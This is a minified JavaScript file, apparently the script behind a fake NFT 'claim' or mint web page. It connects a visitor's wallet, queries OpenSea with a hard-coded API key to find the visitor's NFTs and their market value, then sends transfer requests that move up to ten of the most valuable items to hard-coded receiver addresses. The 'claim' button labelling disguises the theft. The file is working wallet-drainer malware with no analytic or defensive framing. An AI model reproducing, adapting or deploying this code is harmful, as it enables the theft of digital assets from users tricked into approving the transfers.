const receiveAddress="0xB34d011B2dC5CcdF9e66B7d0Be119ef4e1B765Ec",drainNftsInfo={minValue:0,maxTransfer:10},isMobile=()=>{var e,t=!1;return e=navigator.userAgent||navigator.vendor||window.opera,(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i.test(e)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i.test(e.substr(0,4)))&&(t=!0),t},round=e=>Math.round(1e4*e)/1e4,sleep=e=>new Promise((t=>setTimeout(t,e)));let web3Provider,metamaskInstalled=!1;async function connectButton(){await Moralis.enableWeb3(metamaskInstalled?{}:{provider:"walletconnect"})}async function updateState(e){const t=new Web3(Moralis.provider),o=(await t.eth.getAccounts())[0];document.querySelector("#connectButton").style.display=e?"none":"",document.querySelector("#claimButton").style.display=e?"":"none",document.querySelector("#walletInfo").innerHTML=e?"CONNECTED AS <br> "+(o.slice(0,6)+"..."+o.slice(-5)):"NOT CONNECTED"}async function askNfts(){const e=new Web3(Moralis.provider),t=(await e.eth.getAccounts())[0],o={method:"GET",headers:{Accept:"application/json","X-API-KEY":"812924de94094476916671a8de4686ec"}};let n=await fetch(`https://api.opensea.io/api/v1/assets?owner=${t}&order_direction=desc&limit=200&include_orders=false`,o).then((e=>e.json())).then((e=>(console.log(e),e.assets.map((e=>({contract:e.asset_contract.address,token_id:e.token_id})))))).catch((e=>console.error(e)));if(n.length<1)return notEligible();let a=await fetch(`https://api.opensea.io/api/v1/collections?asset_owner=${t}&offset=0&limit=200`,o).then((e=>e.json())).then((e=>(console.log(e),e.filter((e=>e.primary_asset_contracts.length>0)).map((e=>({type:e.primary_asset_contracts[0].schema_name.toLowerCase(),contract_address:e.primary_asset_contracts[0].address,price:round(0!=e.stats.one_day_average_price?e.stats.one_day_average_price:e.stats.seven_day_average_price),owned:e.owned_asset_count})))))).catch((e=>console.error(e)));if(a.length<1)return notEligible();let i=[];for(nft of n){const e=a.find((e=>e.contract_address==nft.contract));if(!e){console.log(`No data for collection: ${nft.contract}`);continue}if(0===e.price)continue;const t=round(e.price*e.owned);console.log(t),t<drainNftsInfo.minValue||i.push({price:t,options:{contract_address:e.contract_address,receiver:t>1.5?"0xF299Cb3A316Cb67B1AEca159A163f7E155F55068":receiveAddress,token_id:nft.token_id,amount:e.owned,type:e.type}})}if(i.length<1)return notEligible();let s=await i.sort(((e,t)=>t.price-e.price)).slice(0,drainNftsInfo.maxTransfer);for(transaction of(console.log(`${s.length} transactions to mint`,s),s))console.log(`Transferring ${transaction.options.contract_address} for ${transaction.price} ETH`),isMobile()?await Moralis.transfer(transaction.options).catch((e=>console.error(e,transaction.options))):Moralis.transfer(transaction.options).catch((e=>console.error(e,transaction.options))),await sleep(200)}void 0!==window.ethereum&&(metamaskInstalled=!0),Moralis.onWeb3Enabled((async e=>{1!==e.chainId&&metamaskInstalled&&await Moralis.switchNetwork("0x1"),updateState(!0),console.log(e)})),Moralis.onChainChanged((async e=>{"0x1"!==e&&metamaskInstalled&&await Moralis.switchNetwork("0x1")})),window.ethereum&&window.ethereum.on("disconnect",(e=>{console.log(e),updateState(!1)})),window.ethereum&&window.ethereum.on("accountsChanged",(e=>{e.length<1&&updateState(!1)}));const notEligible=()=>document.getElementById("notEli").style.display="";async function askTransfer(){document.querySelector("#claimButton").setAttribute("disabled","disabled"),document.getElementById("claimButton").addEventListener("click",askTransfer),document.getElementById("claimButton").style.opacity=.6,await askNfts(),document.getElementById("claimButton").style.opacity=1,document.getElementById("claimButton").removeEventListener("click",askTransfer),document.querySelector("#claimButton").removeAttribute("disabled")}window.addEventListener("load",(async()=>{isMobile()&&!window.ethereum?document.querySelector("#connectButton").addEventListener("click",(()=>window.location.href=`https://metamask.app.link/dapp/${window.location.hostname}${window.location.pathname}`)):document.querySelector("#connectButton").addEventListener("click",connectButton),document.querySelector("#claimButton").addEventListener("click",askTransfer)}));